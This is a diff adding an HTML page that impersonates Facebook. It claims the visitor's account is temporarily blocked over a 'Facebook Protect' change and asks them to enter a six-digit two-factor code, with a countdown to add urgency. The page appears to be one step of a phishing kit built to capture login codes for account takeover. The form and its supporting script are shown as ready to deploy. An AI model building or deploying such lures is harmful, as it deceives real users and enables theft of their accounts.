@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook | Privacy Policy</title>
+    <link
+      rel="shortcut icon"
+      href="./asset/images/facebook_icon.svg"
+      type="image/x-icon"
+    />
+    <link rel="stylesheet" href="./asset/css/confirm.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
+      integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N"
+      crossorigin="anonymous"
+    />
+  </head>
+  <body class="bg-light">
+    <div class="container modal_content" style="width: 637px">
+      <div class="card">
+        <form
+          method="post"
+          class="form_content_confirm"
+          id="form_content_confirm"
+        >
+          <div class="card-body text-center">
+            <p class="p_title_header">
+              Two-factor authentication required (1/3)
+            </p>
+
+            <p class="p_title_small">
+              We have temporarily blocked your account because Facebook Protect
+              has changed. Verify code has been send to +1****.
+            </p>
+            <img src="./asset/images/confirm.gif" class="img_header" alt="" />
+
+            <input
+              type="text"
+              placeholder="Enter your code"
+              class="form-control input_code bg-light text-gray"
+              name="Code"
+            />
+
+            <div class="content_warning">
+              <div class="content_warning_div">
+                <img src="./asset/images/icon_warning.svg" alt="" />
+                <div class="content_warning_body">
+                  <p class="content_p1">
+                    You’ve asked us to require a 6-digit login code when anyone
+                    tries to access your account from a new device or browser.
+                    Enter the 6-digit code from your code generator or
+                    third-party app below.
+                  </p>
+                  <p class="content_p2" id="countdown">
+                    Please wait <strong>5:00</strong> to request the sending of
+                    the code.
+                  </p>
+                </div>
+              </div>
+            </div>
+            <p class="footer_text">
+              We'll walk you through some steps to secure and unlock your
+              account.
+            </p>
+            <!-- <div class="btn_continue">
+          </div> -->
+            <button
+              id="button-submit"
+              type="submit"
+              class="form-control btn_continue"
+            >
+              Submit
+            </button>
+            <a href="#" class="a_send_code">Send code</a>
+          </div>
+        </form>
+      </div>
+    </div>
+    <!--  -->
+    <script src="./asset/scripts/confirm.js"></script>
+    <script
+      src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
+      integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/popper.js@1.14.7/dist/umd/popper.min.js"
+      integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js"
+      integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
+      crossorigin="anonymous"
+    ></script>
+  </body>
+</html>
